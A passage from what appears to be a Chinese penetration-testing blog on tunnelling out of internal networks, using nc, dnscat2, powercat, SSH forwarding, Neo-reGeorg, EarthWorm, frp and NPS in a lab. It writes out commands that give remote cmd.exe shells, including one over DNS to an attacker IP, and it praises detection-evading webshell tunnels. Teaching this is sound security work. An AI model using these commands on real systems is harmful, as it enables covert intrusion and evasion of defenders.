c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161935998.png" alt="image-20240107161935998"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 9999<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162000025.png" alt="image-20240107162000025"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162013928.png" alt="image-20240107162013928"><br>2.nc代理<br>在这里插入图片描述</p><p>在kali中访问到10.10.10.12<br>在kali中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 3333<br></code></pre></td></tr></table></figure><p>在内网主机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp  3333 -e c:\windows\system32\cmd.exe<br></code></pre></td></tr></table></figure><p>在web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.43.254 3333 -c <span class="hljs-string">&quot;nc -v 10.10.10.12 3333&quot;</span><br></code></pre></td></tr></table></figure><p>由于我环境问题就不演示了，在实战中也基本不会用到，了解就行了</p><p><strong>2.3应用层隧道技术</strong><br>常用的隧道协议有ssh、htto\https和dns。</p><ul><li>DNS协议:<br>首先，需要知道当前服务器是否允许内部的DNS解析外部的域名，也就是要测试DNS的连通性。<br>输入如下命令查看当前内部域名及IP地址：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#linux</span><br><span class="hljs-built_in">cat</span> /etc/resolv.conf | grep -v <span class="hljs-string">&#x27;#&#x27;</span><br><span class="hljs-comment">#windows</span><br>nslookup 内部的域名<br></code></pre></td></tr></table></figure><p>能够通过内部dns服务器解析外部域名，这意味着可以使用DNS隧道隐蔽通信。<br>（1）dnscat2<br>dnscat2工具的服务端是由ruby语言编写，而客户端是由c语言编写。现在也有powershell版。<br>它可以用自己的本身的客户端也可以用powercat作为客户端(powecat可以说是nc的powershell版)</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接指向IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器，与直连相比，中继模式的速度较慢。<br>服务端：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动</span><br>ruby./dnscat2.rb abc.com --secret=123456   <span class="hljs-comment">#方式1【常用】</span><br>ruby./dnscat2.rb --dns server=127.0.0.1,port=53,<span class="hljs-built_in">type</span>=TXT --secret=123456   <span class="hljs-comment">#方式2</span><br>ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="hljs-comment">#方式3</span><br>ruby ./dnscat2.rb  <span class="hljs-comment">#方式4</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#命令详解</span><br>-c : 加密通信<br>-e ：规定安全级别，<span class="hljs-string">&#x27;open&#x27;</span>表示服务端允许客户端不进行加密<br>--no-cache : 禁止缓存。<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162126093.png" alt="image-20240107162126093"></p><p>客户端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnscat --secret=123456 abc.com    <span class="hljs-comment">#对应 方式1、3</span><br>dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553,<span class="hljs-built_in">type</span>=TXT   <span class="hljs-comment">#对应 方式2，注意使用--dns选项时，port不可省，否则可能连不上</span><br>./dnscat --dns=server=192.168.43.254,port=53 <span class="hljs-comment">#对应方式4</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162132983.png" alt="image-20240107162132983"><br>结果：<br>可以看见已经接收到一个session<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162141958.png" alt="image-20240107162141958"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162737654.png" alt="image-20240107162737654"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162800390.png" alt="image-20240107162800390"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162808908.png" alt="image-20240107162808908"><br>在这里就可以执行命令操作了<br>（2)dnscat+powercat<br>客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\powercat.ps1<br>powercat -c 192.168.43.254 -p 53 -dns aaa.com -e cmd.exe<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162839444.png" alt="image-20240107162839444">服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby dnscat2.rb aaa.com -e open --no-cache<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162848940.png" alt="image-20240107162848940">收到session</p><p>powercat 也可像nc哪像使用，使用方法都差不多。</p><p>详细学习请参考：<a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><ul><li>ssh协议：<br>创建ssh隧道的常用参数：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">-C ： 压缩传输，提高传输速度。<br>-f ： 将ssh传输转入后台执行，不占用当前的shell。<br>-N ：建立默认连接（建立了连接，但是看不到具体会话）。<br>-g ：允许远程主机连接本地用于转发的端口。<br>-L : 本地端口转发。<br>-R ： 远程端口转发。<br>-D ： 动态转发(socks代理）。<br>-P ：指定ssh端口。<br></code></pre></td></tr></table></figure><p>（1）本地转发<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162858746.png" alt="image-20240107162858746"><br>测试目标：跳板机为跳板访问windows2008  3389端口<br>将内网windows主机3389端口映射到攻击机本地端口上。在访问这个本地端口就可以访问目标机的3389端口了<br>攻击执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -L 1111:10.10.10.30:3389 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162908403.png" alt="image-20240107162908403">这里要输入跳板机的登录密码<br>成功之后查看本地1111端口是否已经连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -tulnp | grep <span class="hljs-string">&quot;1111&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162920094.png" alt="image-20240107162920094"></p><p>在kali中执行 rdesktop 127.0.0.1:1111<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162929610.png" alt="image-20240107162929610"><br>映射成功</p><p>ssh本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道传输到远端的对应端口。</p><p>（2)远程转发</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162939349.png" alt="image-20240107162939349"></p><p>web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -R 3333:10.10.10.30:3389 root@192.168.43.254<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162948404.png" alt="image-20240107162948404"><br>kali中输入  redesktop 127.0.0.1:3333<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162956663.png" alt="image-20240107162956663"><br>成功建立连接</p><p>本地端口转发是将远程主机某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问这个远程服务器指定端口的数据都会通过ssh隧道传输到本地的对应端口。</p><p>（3）动态转发<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163716465.png" alt="image-20240107163716465"><br>在kali中执行如下命令，建立一个动态的socks 4&#x2F;5代理通道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -D 7000 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163723443.png" alt="image-20240107163723443">成功后配置proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163730795.png" alt="image-20240107163730795"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163739167.png" alt="image-20240107163739167"><br>成功访问到内网主机</p><p>动态端口映射就是建立一个ssh加密的socks 4&#x2F;5代理通道。任何支持 socks 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><p><strong>2.4 HTTP&#x2F;HTTPS协议</strong><br>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg,meterpreter,tunna等</p><ul><li>reGeorg<br>reGeorg支持ASPX,PHP,JSP等web脚本，并提供了一个Tomcat5版本。<br>这里使用Neo-reGeorg是大佬改版的reGeorg。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！</li></ul><p>实验环境：</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163814492.png" alt="image-20240107163814492"></p><p>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163825010.png" alt="image-20240107163825010"><br>将相应脚本文件上传到目标服务器上<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163832513.png" alt="image-20240107163832513"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163841466.png" alt="image-20240107163841466"></p><p>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163849711.png" alt="image-20240107163849711"><br>测试与目标机连通<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163857903.png" alt="image-20240107163857903"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>隧道隐藏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透中拿到一台边缘机器后剩余内网机器不出网的情况很常见，这时我们就需要把内网机器流量转到边缘机器上再进行访问，内网流量转出来的方法很多，在下面就介绍几种常见的方法</p><p><strong>EarhWorm</strong></p><p>ew参数说明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f : 设置连接主机地址。<br>-g : 设置连接端口。<br>-d : 设置反连主机地址。<br>-e : 设置反连端口。<br>-l : 为服务启动打开一个端口。<br>-s :  状态设置功能。<br></code></pre></td></tr></table></figure><p>6中链路状态 -s参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssocksd    rcsocks   rssocks<br>lcx_slave  lcx_tran  lcx_listen<br>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。<br><br>lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。<br><br>lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。<br><br>lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。<br><br>lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。<br><br>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。<br></code></pre></td></tr></table></figure><p>实验环境：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155935229.png" alt="image-20240107155935229"></p><p>EW是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两大核心功能，可以在复杂的网络环境中实现网络穿透。同时EW能够以正向，反向，多级级联等方式建立网络隧道。<br>（1）正向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s ssocksd -l 8888<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155943083.png" alt="image-20240107155943083">在socksCap64添加这个IP地址的代理<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155952271.png" alt="image-20240107155952271"><br>在攻击机上访问内网目标主机：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160003617.png" alt="image-20240107160003617"></p><p>（2）反向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew -s rssocks -d 192.168.43.234 -e 1111<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160011248.png" alt="image-20240107160011248"></p><p>在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s rcsocks -l 1008 -e 888<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160019595.png" alt="image-20240107160019595"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160028898.png" alt="image-20240107160028898"></p><p>更多参考：<a href="https://www.freebuf.com/sectool/259634.html">https://www.freebuf.com/sectool/259634.html</a></p><p><strong>Neo-reGeorg</strong><br>它是由reGeorg经过大佬改版的。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！<br>实验环境：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160045055.png" alt="image-20240107160045055"><br>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160054903.png" alt="image-20240107160054903"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160104847.png" alt="image-20240107160104847"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160124136.png" alt="image-20240107160124136"><br>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160133759.png" alt="image-20240107160133759">测试与目标机连通<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160144683.png" alt="image-20240107160144683"><strong>frp</strong><br>攻击机设置frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>bind_port = 6666<br></code></pre></td></tr></table></figure><p>运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frps.exe -c frps.ini<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160156584.png" alt="image-20240107160156584"></p><p>在边缘机器设置frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.10.3<br>server_port = 6666<br>[http_proxy]<br><span class="hljs-built_in">type</span>=tcp<br>remote_port=7777<br>plugin=socks5<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160204408.png" alt="image-20240107160204408"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160216228.png" alt="image-20240107160216228"></p><p><strong>NPS</strong><br>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">项目地址：https://github.com/ehang-io/nps/releases/tag/v0.26.9 <br></code></pre></td></tr></table></figure><p>服务端配置文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">appname = nps<br><span class="hljs-comment">#Boot mode(dev|pro)</span><br>runmode = dev<br><br><span class="hljs-comment">#HTTP(S) proxy port, no startup if empty</span><br>http_proxy_ip=0.0.0.0<br>http_proxy_port=80     <span class="hljs-comment">#域名代理http代理监听端口</span><br>https_proxy_port=443   <span class="hljs-comment">#域名代理https代理监听端口(一般会修改这两个端口，避免端口冲突)</span><br>https_just_proxy=<span class="hljs-literal">true</span><br><span class="hljs-comment">#default https certificate setting</span><br>https_default_cert_file=conf/server.pem<br>https_default_key_file=conf/server.key<br><br><span class="hljs-comment">##bridge</span><br>bridge_type=tcp      <span class="hljs-comment">#客户端与服务端连接方式kcp或tcp</span><br>bridge_port=8024     <span class="hljs-comment">#服务端客户端通信端口，也就是说客户端通过访问服务端的这个端口可以进行连接</span><br>bridge_ip=0.0.0.0<br><br><span class="hljs-comment"># Public password, which clients can use to connect to the server</span><br><span class="hljs-comment"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br>public_vkey=123      <span class="hljs-comment">#客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</span><br><br><span class="hljs-comment">#Traffic data persistence interval(minute)</span><br><span class="hljs-comment">#Ignorance means no persistence</span><br><span class="hljs-comment">#flow_store_interval=1   #服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</span><br><br><span class="hljs-comment"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7</span><br>log_level=7         <span class="hljs-comment">#日志输出级别</span><br><span class="hljs-comment">#log_path=nps.log</span><br><br><span class="hljs-comment">#Whether to restrict IP access, true or false or ignore</span><br><span class="hljs-comment">#ip_limit=true      #是否限制ip访问，true或false或忽略</span><br><br><span class="hljs-comment">#p2p</span><br><span class="hljs-comment">#p2p_ip=127.0.0.1    #服务端IP，使用p2p模式必填</span><br><span class="hljs-comment">#p2p_port=6000       #p2p模式开启的udp端口</span><br><br><span class="hljs-comment">#web</span><br>web_host=a.o.com<br>web_username=admin   <span 